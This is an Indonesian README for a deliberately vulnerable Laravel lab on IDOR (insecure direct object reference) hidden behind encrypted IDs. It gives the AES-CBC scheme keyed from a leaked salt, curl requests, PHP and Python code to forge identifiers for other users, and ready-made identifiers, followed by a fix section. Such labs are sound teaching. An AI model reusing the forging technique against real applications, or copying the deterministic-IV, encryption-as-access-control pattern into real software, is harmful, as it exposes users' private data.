# Lab Keamanan Web — Branch 3: IDOR dengan ID Terenkripsi (Challenge)

> **PERINGATAN:** Aplikasi ini sengaja dibuat rentan untuk tujuan edukasi.
> Jangan pernah deploy ke internet publik dan jangan tiru polanya di produksi.

## Setup

```bash
composer install
npm install
php artisan key:generate
php artisan migrate:fresh --seed
npm run dev
php artisan serve
```

User demo (password semua: `password`): `attacker@example.com` (id 1),
`victim1@example.com` (id 2), `victim2@example.com` (id 3).

## Kerentanan

```
GET /api/profile/{identifier}        (butuh login)
```

Sekarang URL **tidak lagi pakai id angka**. `{identifier}` adalah id user yang
sudah dienkripsi memakai `salt`. Kelihatannya aman — padahal IDOR tetap ada:
siapa pun yang punya `salt` (bocor di branch 2) bisa membuat identifier untuk
id mana pun.

### Skema enkripsi (bisa direproduksi di bahasa apa pun)

```
key        = sha256(salt)                      // 32 byte, AES-256
iv         = 16 byte pertama dari sha256(salt)
cipher     = AES-256-CBC(plaintext = id, key, iv)
identifier = base64url(cipher)
```

## Alur challenge (untuk peserta)

1. Coba akses dengan id angka biasa:
   ```bash
   curl -b "cookie_sesi" http://localhost:8000/api/profile/1
   ```
   Respons (422): `{"message":"kita butuh garam garam garam", ...}`
2. Dari branch 2, peserta sudah tahu `salt = Y0uM16htN33dM3`.
3. Peserta enkripsi id target pakai skema di atas → dapat identifier → akses:
   ```bash
   curl -b "cookie_sesi" http://localhost:8000/api/profile/zc1B_N1scACxwjSNy8StqQ
   ```
   Data `victim1` keluar. IDOR berhasil lagi.

### Identifier siap pakai (salt default)

| id | user                | identifier                |
|----|---------------------|---------------------------|
| 1  | attacker@example.com | `NVCEcx3dYHQ7JrkrmHC87w` |
| 2  | victim1@example.com  | `zc1B_N1scACxwjSNy8StqQ` |
| 3  | victim2@example.com  | `jOU5ylTEV-VTRK9879rMOw` |

### Contoh generate identifier

PHP:
```php
$salt = 'Y0uM16htN33dM3';
$digest = hash('sha256', $salt, true);
$cipher = openssl_encrypt('2', 'aes-256-cbc', $digest, OPENSSL_RAW_DATA, substr($digest, 0, 16));
echo rtrim(strtr(base64_encode($cipher), '+/', '-_'), '='); // zc1B_N1scACxwjSNy8StqQ
```

Python:
```python
import hashlib, base64
from Crypto.Cipher import AES  # pip install pycryptodome
salt = b'Y0uM16htN33dM3'
digest = hashlib.sha256(salt).digest()
pt = b'2'; pad = 16 - len(pt) % 16
ct = AES.new(digest, AES.MODE_CBC, digest[:16]).encrypt(pt + bytes([pad]) * pad)
print(base64.urlsafe_b64encode(ct).rstrip(b'='))  # zc1B_N1scACxwjSNy8StqQ
```

## File yang relevan

- `app/Support/LabCipher.php` — enkripsi/dekripsi id berbasis salt
- `app/Http/Controllers/Api/EncryptedProfileController.php` — controller + hint
- `config/lab.php` — nilai `salt`
- `tests/Feature/SecurityLab/EncryptedProfileIdorTest.php`

## Perbaikan (yang seharusnya dilakukan)

- Enkripsi id **bukan** kontrol akses. Tetap wajib otorisasi per-objek.
- Jangan pakai key rahasia yang bisa bocor lewat API (seperti `salt` di sini).
- Pakai IV acak + MAC (mis. Laravel `Crypt`), bukan IV deterministik.
- Jangan bocorkan hash password / token reset.
